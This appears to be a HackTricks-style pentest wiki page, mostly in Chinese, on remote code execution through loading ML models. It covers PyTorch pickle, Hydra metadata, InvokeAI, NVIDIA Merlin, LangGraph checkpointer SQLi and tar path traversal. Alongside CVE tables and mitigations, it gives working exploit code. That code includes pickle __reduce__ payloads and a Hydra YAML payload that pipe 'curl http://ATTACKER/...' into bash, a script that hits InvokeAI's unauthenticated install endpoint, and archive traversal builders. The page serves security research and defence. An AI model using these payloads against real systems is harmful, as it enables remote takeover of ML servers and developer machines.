# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models 通常以不同格式共享，例如 ONNX、TensorFlow、PyTorch 等。这些模型可以被加载到开发者的机器或生产系统中供其使用。通常，模型不应包含恶意代码，但在某些情况下，模型可能被用来在系统上执行任意代码，作为预期功能的一部分，或由于模型加载库中的漏洞所致。

截至本文撰写时，以下是此类漏洞的一些示例：

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | 模型 checkpoint 中的恶意 pickle 导致代码执行（绕过 `weights_only` 防护）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**、**CVE-2022-1471**                                                                         | SSRF + 恶意模型下载导致代码执行；management API 中的 Java 反序列化 RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | 通过 `torch.load` 进行不安全的 checkpoint 反序列化 **(CVE-2025-23298)**                                           | 不受信任的 checkpoint 在 `load_model_trainer_states_from_checkpoint` 期间触发 pickle reducer → 在 ML worker 中执行代码            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + 不安全的 MessagePack 扩展 hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | 用户可控的 `filter` key 注入 SQL/JSON-path 语法，`UNION SELECT` 伪造 fake checkpoint row，随后 `msgpack` 反序列化导入并调用攻击者选择的 Python 代码 | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678**（不安全的 YAML） <br> **CVE-2024-3660**（Keras Lambda）                                                      | 从 YAML 加载模型时使用 `yaml.unsafe_load`（代码执行） <br> 使用 **Lambda** layer 加载模型时运行任意 Python 代码          | |
| TensorFlow (TFLite)         | **CVE-2022-23559**（TFLite parsing）                                                                                          | 构造的 `.tflite` 模型触发 integer overflow → heap corruption（可能导致 RCE）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092**（joblib/pickle）                                                                                           | 通过 `joblib.load` 加载模型时，使用攻击者的 `__reduce__` payload 执行 pickle                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446**（不安全的 `np.load`）*存在争议*                                                                              | `numpy.load` 默认允许 pickle object arrays —— 恶意 `.npy/.npz` 触发代码执行                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882**（dir traversal） <br> **CVE-2024-5187**（tar traversal）                                                    | ONNX 模型的 external-weights path 可逃逸目录（读取任意文件） <br> 恶意 ONNX model tar 可覆盖任意文件（导致 RCE） | |
| ONNX Runtime (design risk)  | *No CVE* ONNX custom ops / control flow                                                                                    | 带有 custom operator 的模型需要加载攻击者的 native code；复杂的 model graphs 可滥用逻辑来执行非预期的计算   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036**（path traversal）                                                                                          | 在启用 `--model-control` 的情况下使用 model-load API，允许通过 relative path traversal 写入文件（例如覆盖 `.bashrc` 以实现 RCE）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668**（multiple heap overflows）                                                                         | 畸形 GGUF model file 导致 parser 中发生 heap buffer overflows，从而能够在受害者系统上执行任意代码                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | 带有 Lambda layer 的恶意 HDF5（`.h5`）模型在加载时仍会执行代码（Keras safe_mode 不覆盖旧格式 —— “downgrade attack”） | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 许多 ML tools（例如基于 pickle 的 model formats、Python `pickle.load`）都会执行嵌入模型文件中的任意代码，除非采取缓解措施 | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 传递给 `hydra.utils.instantiate()` 的不受信任 metadata **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻击者控制的 model metadata/config 将 `_target_` 设置为任意 callable（例如 `builtins.exec`）→ 在加载期间执行，即使使用“安全”格式（`.safetensors`、`.nemo`、repo `config.json`） | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

此外，还有一些基于 Python pickle 的模型，例如 [PyTorch](https://github.com/pytorch/pytorch/security) 使用的模型，如果未使用 `weights_only=True` 加载，则可用于在系统上执行任意代码。因此，任何基于 pickle 的模型都可能特别容易受到此类攻击，即使它们未列在上面的表格中。

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` 会导入并调用配置/metadata 对象中的任意带点号的 `_target_`。当库将**不受信任的模型 metadata**传递给 `instantiate()` 时，攻击者可以提供一个 callable 及其参数，在模型加载期间立即运行（无需 pickle）。<sup>[[12]](#references)</sup>

Payload example（适用于 `.nemo` `model_config.yaml`、repo `config.json` 或 `.safetensors` 中的 `__metadata__`）：
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
要点：
- 在 NeMo 的 `restore_from/from_pretrained`、uni2TS HuggingFace coders 和 FlexTok loaders 中，会在 model initialization 之前触发。
- Hydra 的 string block-list 可通过 alternative import paths 绕过（例如 `enum.bltns.eval`），或使用 application-resolved names（例如 `nemo.core.classes.common.os.system` → `posix`）。
- FlexTok 还会使用 `ast.literal_eval` 解析 stringified metadata，从而在 Hydra call 之前实现 DoS（CPU/memory blowup）。

### 🆕 通过 `torch.load` 实现 InvokeAI RCE（CVE-2024-12029）

`InvokeAI` 是一个流行的开源 Stable-Diffusion web interface。版本 **5.3.1 – 5.4.2** 暴露了 REST endpoint `/api/v2/models/install`，允许用户从任意 URL 下载并加载 models。<sup>[[1]](#references)</sup>

该 endpoint 最终会调用：
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
当提供的文件是 **PyTorch checkpoint（`*.ckpt`）** 时，`torch.load` 会执行 **pickle 反序列化**。由于内容直接来自用户控制的 URL，攻击者可以在 checkpoint 中嵌入带有自定义 `__reduce__` 方法的恶意对象；该方法会在**反序列化期间**执行，从而在 InvokeAI server 上导致**远程代码执行（RCE）**。

该 vulnerability 被分配为 **CVE-2024-12029**（CVSS 9.8，EPSS 61.17 %）。

#### Exploitation walk-through

1. 创建恶意 checkpoint：
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 在你控制的 HTTP server 上托管 `payload.ckpt`（例如 `http://ATTACKER/payload.ckpt`）。
3. 触发存在漏洞的 endpoint（无需 authentication）：
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. 当 InvokeAI 下载该文件时，它会调用 `torch.load()` → `os.system` gadget 执行，攻击者便可在 InvokeAI 进程的上下文中获得代码执行权限。

现成的 exploit：**Metasploit** 模块 `exploit/linux/http/invokeai_rce_cve_2024_12029` 可自动完成整个流程。<sup>[[3]](#references)</sup>

#### 条件

•  InvokeAI 5.3.1-5.4.2（扫描标志默认为 **false**）  
•  攻击者可访问 `/api/v2/models/install`  
•  进程具有执行 shell 命令的权限

#### 缓解措施

* 升级到 **InvokeAI ≥ 5.4.3** – 该补丁默认设置 `scan=True`，并在反序列化前执行 malware scanning。
* 以编程方式加载 checkpoint 时，使用 `torch.load(file, weights_only=True)` 或新的 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper。
* 对 model source 和 signature 实施 allow-list，并以 least-privilege 运行该服务。

> ⚠️ 请记住，任何基于 Python pickle 的格式（包括许多 `.pt`、`.pkl`、`.ckpt`、`.pth` 文件）从不可信来源进行反序列化时，本质上都是不安全的。

---

如果必须让旧版 InvokeAI 继续运行在 reverse proxy 后方，以下是一个临时 mitigation 示例：
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec 通过不安全的 `torch.load` 实现 RCE（CVE-2025-23298）

NVIDIA 的 Transformers4Rec（Merlin 的一部分）暴露了一个不安全的 checkpoint loader，直接对用户提供的路径调用 `torch.load()`。由于 `torch.load` 依赖 Python `pickle`，攻击者控制的 checkpoint 可以在反序列化期间通过 reducer 执行任意代码。<sup>[[5]](#references)</sup>

存在漏洞的路径（修复前）：`transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

为何这会导致 RCE：在 Python pickle 中，对象可以定义一个 reducer（`__reduce__`/`__setstate__`），返回一个 callable 及其参数。该 callable 会在 unpickling 期间执行。如果 checkpoint 中存在这样的对象，它会在使用任何权重之前运行。

最小恶意 checkpoint 示例：
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- 通过 repos、buckets 或 artifact registries 共享的 Trojanized checkpoints/models
- 会自动加载 checkpoints 的自动化 resume/deploy pipelines
- 执行发生在 training/inference workers 内部，通常具有较高权限（例如容器中的 root）

修复：Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）将直接调用 `torch.load()` 替换为在 `transformers4rec/utils/serialization.py` 中实现的受限、allow-listed deserializer。新的 loader 会验证类型和字段，并防止在 load 期间调用任意 callable。<sup>[[7]](#references)</sup>

针对 PyTorch checkpoints 的防御建议：
- 不要 unpickle 不受信任的数据。尽可能优先使用 [Safetensors](https://huggingface.co/docs/safetensors/index) 或 ONNX 等不可执行格式。
- 如果必须使用 PyTorch serialization，请确保 `weights_only=True`（较新的 PyTorch 支持），或使用类似 Transformers4Rec patch 的自定义 allow-listed unpickler。
- 强制执行 model provenance/signatures，并对 deserialization 进行 sandbox（seccomp/AppArmor；使用 non-root user；限制 FS 且禁止 network egress）。
- 监控 ML services 在 checkpoint load 时是否创建了异常的 child processes；追踪 `torch.load()`/`pickle` 的使用情况。

POC 和 vulnerable/patch references：<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## 示例 – crafting a malicious PyTorch model

- 创建 model：
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 加载模型：
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD 暴露了一个会对用户控制的数据进行反序列化的 `resnet` endpoint。ZDI 确认，远程攻击者可以诱使受害者加载恶意页面/文件，使其向该 endpoint 推送特制的 serialized blob，并以 `root` 身份触发反序列化，从而导致完全 compromission。

该 exploit flow 与典型的 pickle abuse 类似：
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
在反序列化期间可访问的任何 gadget（构造函数、`__setstate__`、framework callbacks 等）都可以用相同方式 weaponize，无论传输方式是 HTTP、WebSocket，还是丢入受监控目录中的文件。



### LangGraph checkpointer SQLi → MessagePack RCE

这条攻击链很有意思，因为攻击者**不需要上传恶意 model 文件**。相反，应用暴露了一个 **AI-agent persistence API**（`get_state_history(..., filter=...)`），并且用户输入会进入 checkpointer query builder。

#### 1. metadata filters 中的 Structural SQLi

一个存在漏洞的 SQLite 模式如下：
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
该值稍后才会绑定，但 `query_key` 会被拼接进 **JSON path 字符串**，因此字典键中的 `'` 会跳出 `'$.{query_key}'`，并注入 SQL。这里同样适用于 **JSON paths、identifiers、operators、`LIMIT` 和 TTL fields**：占位符只能保护值，不能保护结构化查询语法。

#### 2. `UNION SELECT` 可以针对下游 sinks，而不仅仅是窃取数据

该查询返回 `type` 和序列化后的 `checkpoint` 字节，后续会被作为以下内容使用：
```python
self.serde.loads_typed((type, checkpoint))
```
这意味着，`WHERE` 子句中的 SQLi 可以注入一个**伪造的结果行**：
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
如果后续代码会解析、反序列化、写入或执行任何选定的列，请将这些列映射到其 sinks。在此情况下，fake row 将 SQLi 转化为**攻击者控制的反序列化**。

#### 3. 不安全的 MessagePack extension hooks 等同于代码 gadgets

LangGraph 的 `msgpack` 路径使用了一个 custom extension hook，该 hook 会解包嵌套 tuple 并执行：
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
因此，一个编码了等价于 `("os", "system", "id > /tmp/pwned")` 的 MessagePack extension object 会导入 `os`，解析 `system`，并运行该命令。在审查 AI frameworks 时，检查 **custom MessagePack/JSON/pickle revivers** 是否存在 dynamic imports、reflection 或 arbitrary callable dispatch。

#### 4. agent frameworks 的 Practical audit pattern

审查所有到达以下位置的 user-controlled input：
- state history / memory / replay / checkpoint listing APIs
- 能生成 SQL 或 Redis query fragments 的 structured filter builders
- custom deserializers（`pickle`、`msgpack`、`json` object hooks、YAML constructors）
- 信任 persistence layer 返回 rows 的 recovery paths

当 untrusted users 能够控制 `filter` 时，该特定链会影响使用 **SQLite** 或 **Redis** checkpointers 的 self-hosted LangGraph deployments。披露中注明的 patched versions 为 `langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+` 和 `langgraph-checkpoint 4.0.1+`。<sup>[[15]](#references)</sup>

## Models to Path Traversal

正如[**这篇 blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)中所述，不同 AI frameworks 使用的大多数 model formats 都基于 archives，通常是 `.zip`。因此，可能会滥用这些 formats 执行 Path Traversal attacks，从而读取加载 model 的系统中的任意文件。<sup>[[16]](#references)</sup>

例如，使用以下代码可以创建一个 model，使其在加载时于 `/tmp` 目录中创建一个文件：
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
或者，使用以下代码，你可以创建一个模型，在加载时创建一个指向 `/tmp` 目录的符号链接：
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 深入探究：Keras .keras 反序列化与 gadget hunting

如需了解 .keras 内部机制、Lambda-layer RCE、≤ 3.8 中的 arbitrary import 问题，以及修复后 allowlist 内的 gadget discovery，请参阅：


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## 参考资料

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI 不可信数据反序列化"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load 的安全注意事项](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298：在 NVIDIA Merlin 中获取 Remote Code Execution](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 使用现代 AI/ML 格式和库执行 Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate 文档](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit（关于 RCE 的警告）](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – 从 SQLi 到 RCE：利用 LangGraph 的 Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [将 Archive Slip bugs 转化为高价值 AI/ML 漏洞赏金](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
